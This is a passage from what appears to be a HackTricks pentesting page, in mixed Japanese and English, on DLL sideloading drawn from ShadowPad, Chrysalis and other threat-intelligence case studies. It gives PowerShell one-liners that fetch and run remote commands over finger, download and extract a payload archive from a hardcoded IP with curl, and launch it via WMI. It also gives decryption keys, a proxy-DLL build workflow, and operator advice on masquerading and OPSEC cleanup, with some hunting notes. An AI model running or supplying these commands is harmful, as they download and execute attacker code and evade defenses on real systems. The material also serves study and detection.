- この technique は host binary による DLL name resolution に依存する。host が absolute paths や safe loading flags（例: LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories）を使うと、hijack は失敗する可能性がある。
- KnownDLLs、SxS、forwarded exports は precedence に影響し、host binary と export set の選定時に考慮する必要がある。

## Signed triads + encrypted payloads (ShadowPad case study)

Check Point は、Ink Dragon が ShadowPad を配備するために、正規ソフトウェアになじませつつ core payload を disk 上で encrypted のまま保つ **three-file triad** を使っていると説明した。

1. **Signed host EXE** – AMD、Realtek、NVIDIA などの vendor が悪用される（`vncutil64.exe`、`ApplicationLogs.exe`、`msedge_proxyLog.exe`）。攻撃者は executable を Windows binary らしく見える名前（例: `conhost.exe`）に rename するが、Authenticode signature は有効なまま残る。
2. **Malicious loader DLL** – EXE の横に期待される名前で配置される（`vncutil64loc.dll`、`atiadlxy.dll`、`msedge_proxyLogLOC.dll`）。DLL は通常 ScatterBrain framework で obfuscate された MFC binary で、役割は encrypted blob を見つけ、decrypt し、ShadowPad を reflectively map することだけ。
3. **Encrypted payload blob** – 多くの場合、同じ directory 内の `<name>.tmp` に保存される。decrypted payload を memory-mapping した後、loader は TMP file を削除して forensic evidence を破壊する。

Tradecraft notes:

* Signed EXE を rename しつつ（PE header 内の元の `OriginalFileName` は保持したまま）Windows binary に masquerade させることで vendor signature を維持できる。したがって、実際には AMD/NVIDIA utility なのに `conhost.exe` のように見える binary を drop する Ink Dragon の手口を再現する。
* executable は trusted のままなので、ほとんどの allowlisting control は悪意ある DLL をその横に置くだけでよい。loader DLL のカスタマイズに集中し、signed parent は通常そのまま実行できる。
* ShadowPad の decryptor は、TMP blob が loader の隣にあり、mapping 後にファイルを zero にできるよう writable であることを期待する。payload が load されるまで directory を writable のままにし、memory 上に載った後は OPSEC のために TMP file を安全に削除できる。

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Operators は DLL sideloading と LOLBAS を組み合わせ、disk 上の custom artifact を trusted EXE の横にある malicious DLL だけにする。

- **Remote command loader (Finger):** Hidden PowerShell が `cmd.exe /c` を起動し、Finger server から command を取得して `cmd` に pipe する:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` は TCP/79 の text を取得する。`| cmd` は server response を実行し、operators が second stage server-side を切り替えられるようにする。

- **Built-in download/extract:** benign な extension の archive を download し、unpack して、random な `%LocalAppData%` folder 配下に sideload target と DLL を stage する:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` は進捗を隠し、redirect を追跡する。`tar -xf` は Windows の built-in tar を使う。

- **WMI/CIM launch:** WMI 経由で EXE を start し、telemetry 上では CIM-created process として見えつつ、同じ場所に置かれた DLL を load する:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- local DLL を優先する binary（例: `intelbq.exe`、`nearby_share.exe`）で動作する。payload（例: Remcos）は trusted name の下で実行される。

- **Hunting:** `/p`、`/m`、`/c` が同時に現れる `forfiles` に alert を出す。admin script 以外では珍しい。

## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

最近の Lotus Blossom の intrusion は、trusted な update chain を悪用して NSIS-packed dropper を配備し、DLL sideload と fully in-memory payload を stage した。

Tradecraft flow
- `update.exe`（NSIS）は `%AppData%\Bluetooth` を作成し、**HIDDEN** を設定して、rename された Bitdefender Submission Wizard の `BluetoothService.exe`、malicious な `log.dll`、encrypted blob `BluetoothService` を drop し、その後 EXE を起動する。
- host EXE は `log.dll` を import し、`LogInit`/`LogWrite` を呼ぶ。`LogInit` は blob を mmap-load し、`LogWrite` は custom な LCG-based stream（定数 **0x19660D** / **0x3C6EF35F**、key material は prior hash から導出）で decrypt し、buffer を plaintext shellcode で上書きし、temporary を解放してそこへ jump する。
- IAT を避けるため、loader は export name を **FNV-1a basis 0x811C9DC5 + prime 0x1000193** で hash し、Murmur-style の avalanche（**0x85EBCA6B**）を適用したうえで salted target hash と比較して API を resolve する。

Main shellcode (Chrysalis)
- key `gQ2JR&9;` を使って add/XOR/sub を five passes 繰り返し、PE-like main module を decrypt し、その後 `Kernel32.dll` → `GetProcAddress` を dynamic load して import resolution を完了する。
- per-character の bit-rotate/XOR transform により runtime で DLL name string を再構築し、その後 `oleaut32`、`advapi32`、`shlwapi`、`user32`、`wininet`、`ole32`、`shell32` を load する。
- 2つ目の resolver は **PEB → InMemoryOrderModuleList** をたどり、各 export table を 4-byte block ごとに Murmur-style mixing で parse し、hash が見つからない場合のみ `GetProcAddress` に fallback する。

Embedded configuration & C2
- config は落とされた `BluetoothService` file の **offset 0x30808**（size **0x980**）内にあり、key `qwhvb^435h&*7` で RC4-decrypt され、C2 URL と User-Agent が明らかになる。
- beacon は dot-delimited な host profile を組み立て、tag `4Q` を前置し、`vAuig34%^325hGV` を key に RC4-encrypt してから HTTPS 経由で `HttpSendRequestA` する。response は RC4-decrypt され、tag switch（`4T` shell、`4V` process exec、`4W/4X` file write、`4Y` read/exfil、`4\\` uninstall、`4` drive/file enum + chunked transfer cases）で dispatch される。
- execution mode は CLI args で制御される。args なし = `-i` を指す persistence（service/Run key）を install; `-i` は自分自身を `-k` 付きで再起動; `-k` は install を飛ばして payload を実行する。

Alternate loader observed
- 同じ intrusion では Tiny C Compiler も drop され、`C:\ProgramData\USOShared\` から `svchost.exe -nostdlib -run conf.c` が `libtcc.dll` を横に置いた状態で実行された。攻撃者が提供した C source は shellcode を埋め込み、compile され、PE を disk に書き込まずに in-memory で実行された。再現方法:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- この TCC-based compile-and-run stage は `Wininet.dll` を runtime で import し、hardcoded URL から second-stage shellcode を取得して、compiler run を装う柔軟な loader を実現していた。

## Signed-host sideloading with export proxying + host thread parking

Some DLL sideloading chains add **stability engineering** so the legitimate host stays alive long enough to load later stages cleanly instead of crashing after the malicious DLL is loaded.

Observed pattern
- trusted EXE を malicious DLL の横に、`version.dll` のような期待される dependency name を使って配置する。
- malicious DLL は、期待されるすべての export を real system DLL（たとえば `%SystemRoot%\\System32\\version.dll`）へ **proxy** し、import resolution が成功し続けて host process も動作を維持できるようにする。
- load 後、malicious DLL は host entry point を **patch** し、main thread が終了したり、process を終わらせる code paths を実行したりせず、無限の `Sleep` loop に入るようにする。
- 新しい thread が実際の malicious work を行う。次 stage の DLL 名または path を decrypt し（RC4/XOR が一般的）、`LoadLibrary` で起動する。

Why this matters
- Normal DLL proxying は API compatibility を保つが、host が later stages のために十分長く生き続けることは保証しない。
- main thread を `Sleep(INFINITE)` に待機させるのは、loader が worker thread で decryption、staging、network bootstrap を実行している間、signed process を resident に保つ簡単な方法。
- suspicious な `DllMain` だけを hunting すると、この pattern を見逃す可能性がある。面白い挙動が host entry point の patch 後に発生し、secondary thread が開始されるため。

Minimal workflow
1. signed host EXE をコピーし、local directory から解決される DLL を特定する。
2. 同じ functions を export し、それらを legitimate DLL に forward する proxy DLL を build する。
3. `DllMain(DLL_PROCESS_ATTACH)` で worker thread を作成する。
4. その thread から、host entry point または main thread start routine を patch し、`Sleep` 上で loop するようにする。
5. 次 stage の DLL 名/config を decrypt し、`LoadLibrary` を呼ぶか payload を manual-map する。

Defensive pivots
- `System32` ではなく、application directory から `version.dll` または同様に一般的な library を load する signed processes。
- image load の直後に process entry point へ行われる memory patch、特に `Sleep`/`SleepEx` へ redirect された jumps/calls。
- proxy DLL によって作成された thread が、decrypt された名前の second DLL に対して即座に `LoadLibrary` を呼ぶ。
- `ProgramData`、`%TEMP%`、または unpacked archive paths のような writable staging directories 内で vendor executables の横に置かれた full-export proxy DLL。

## References

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Unit 42 – Converging Interests: Analysis of Threat Clusters Targeting a Southeast Asian Government](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [Unit 42 – Tracking Iranian APT Screening Serpens’ 2026 Espionage Campaigns](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [Microsoft Learn – `<appDomainManagerAssembly>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [Microsoft Learn – `<appDomainManagerType>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [Microsoft Learn – `<probing>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [Microsoft Learn – `<bypassTrustedAppStrongNames>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [Microsoft Learn – `<publisherPolicy>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [Microsoft Learn – `<requiredRuntime>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [Check Point Research – Fast and Furious: Nimbus Manticore Operations During the Iranian Conflict](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)


{{#include ../../../banners/hacktricks-training.md}}
